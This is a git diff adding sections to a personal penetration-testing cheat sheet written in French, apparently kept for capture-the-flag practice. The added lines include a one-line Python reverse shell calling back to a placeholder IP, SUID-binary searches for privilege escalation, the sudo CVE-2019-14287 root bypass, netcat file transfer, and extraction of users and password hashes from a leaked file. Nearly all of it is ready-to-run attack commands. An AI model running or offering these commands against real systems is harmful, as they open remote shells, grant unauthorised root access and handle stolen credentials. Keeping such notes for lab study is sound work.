@@ -60,3 +60,52 @@ gpg --list-secret-keys
 #Décrypter le fichier
 gpg --decrypt backup.pgp
 
+
+###################################### REVERSE SHELLS ###################################
+
+
+Python Reverse Shell:
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+
+##################################### PRIVESC ##########################################
+
+#chercher les bibaire avec le bit SUID
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -o -type  f 2>/dev/null
+
+#chercher les binaire qui peuvent être exécuter avec le groupe <groupe_name>
+find / -group admin -perm /g=x 2>/dev/null
+
+
+
+
+
+##################################### REGEX TRICKS ######################################
+
+
+sed -n 's/.*://p' fowsniff.txt > hashes.txt
+awk -F'@' '{print $1}' fowsniff.txt > users.txt
+sed -n 's/.*://p' cracked.txt > pass.txt
+
+
+##################################### SUDO EXPLOIT ########################################
+
+#sudo version 1.8.27 (CVE-2019-14287) ::: (ALL, !root) /bin/bash
+sudo -u#-1 /bin/bash
+
+
+##################################### UPLOAD FILE #########################################
+
+#Avec netcat
+nc 10.10.132.122 7777 > user.jpg
+nc -q 5 -lvnp 7777 < user.jpg
+
+
+##################################### FIREFOX TRICKS #######################################
+
+#allow ports
+network.security.ports.banned.override
